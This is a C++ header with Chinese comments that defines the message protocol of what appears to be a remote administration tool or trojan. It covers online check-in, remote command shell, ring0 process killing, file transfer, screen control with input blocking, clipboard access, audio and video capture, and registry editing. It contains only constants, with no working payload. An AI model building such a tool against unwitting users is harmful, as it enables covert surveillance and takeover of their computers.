#pragma once
#include <vector>
#include <iostream>
using namespace std;

enum
{
	TRANSFER_MODE_NORMAL = 0x00,	//一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			//追加
	TRANSFER_MODE_ADDITION_ALL,		//全部追加
	TRANSFER_MODE_COVER,		    //覆盖
	TRANSFER_MODE_COVER_ALL,	    //全部覆盖
	TRANSFER_MODE_JUMP,				//覆盖
	TRANSFER_MODE_JUMP_ALL,			//全部覆盖
	TRANSFER_MODE_CANCEL,			//取消传送
};

enum
{
	CLIENT_LOGIN,				// 上线包
	CLIENT_GET_OUT,
	CLIENT_GO_ON,
	CLIENT_INSTANT_MESSAGE_REQUEST,
	CLIENT_INSTANT_MESSAGE_REPLY,
	CLIENT_INSTANT_MESSAGE_COMPLETE,
	CLIENT_SHUT_DOWN_REQUEST,
	CLIENT_SHUT_DOWN_REPLY,
	CLIENT_CMD_MANAGER_REQUIRE,
	CLIENT_CMD_MANAGER_REPLY,
	CLIENT_PROCESS_MANAGER_REQUIRE,
	CLIENT_PROCESS_MANAGER_REPLY,
	CLIENT_PROCESS_REFRESH_REQUIRE,
	CLIENT_PROCESS_RING3_KILL_REQUIRE,
	CLIENT_PROCESS_RING0_KILL_REQUIRE,
	CLIENT_PROCESS_KILL_REPLY,
	CLIENT_FILE_MANAGER_REQUIRE,
	CLIENT_FILE_MANAGER_REPLY,
	CLIENT_FILE_LIST_REQUIRE,
	CLIENT_FILE_LIST_REPLY,
	CLIENT_FILE_MANAGER_SEND_FILE_INFORMATION,
	CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUIRE,        //在客户端中发现了有重名文件
	CLIENT_FILE_MANAGER_SET_TRANSFER_MODE,
	CLIENT_FILE_MANAGER_FILE_DATA,
	CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE,
	CLIENT_WINDOW_MANAGER_REQUIRE,
	CLIENT_WINDOW_MANAGER_REPLY,
	CLIENT_WINDOW_REFRESH_REQUIRE,
	CLIENT_REMOTE_CONTROLL_REQUIRE,
	CLIENT_REMOTE_CONTROLL_REPLY,
	CLIENT_REMOTE_CONTROLL_FIRST_SCREEN,
	CLIENT_REMOTE_CONTROLL_NEXT_SCREEN,
	CLIENT_REMOTE_CONTROLL_CONTROL,
	CLIENT_REMOTE_CONTROLL_BLOCK_INPUT,
	CLIENT_REMOTE_CONTROLL_GET_CLIPBOARD_REQUIRE,
	CLIENT_REMOTE_CONTROLL_GET_CLIPBOARD_REPLY,
	CLIENT_REMOTE_CONTROLL_SET_CLIPBOARD_REQUIRE,
	CLIENT_REMOTE_CONTROLL_SET_CLIPBOARD_REPLY,
	CLIENT_AUDIO_MANAGER_REQUIRE,
	CLIENT_AUDIO_MANAGER_REPLY,
	CLIENT_AUDIO_MANAGER_RECORD_DATA,
	CLIENT_VIDEO_MANAGER_REQUIRE,
	CLIENT_SERVICE_MANAGER_REQUIRE,
	CLIENT_SERVICE_MANAGER_REPLY,
	CLIENT_SERVICE_CONFIG_REQUIRE,
	CLIENT_REGISTER_MANAGER_REQUIRE,
	CLIENT_REGISTER_MANAGER_REPLY,
	CLIENT_REGISTER_MANAGER_DATA_CONTINUE,
	CLIENT_REGISTER_MANAGER_PATH_DATA_REPLY,
	CLIENT_REGISTER_MANAGER_KEY_DATA_REPLY,
};
typedef BOOL(*f1)();
typedef char* (*f2)(ULONG&);
typedef BOOL(*f3)(char*);
typedef BOOL(*f4)(PULONG, ULONG);
typedef BOOL(*f5)(char*, ULONG);
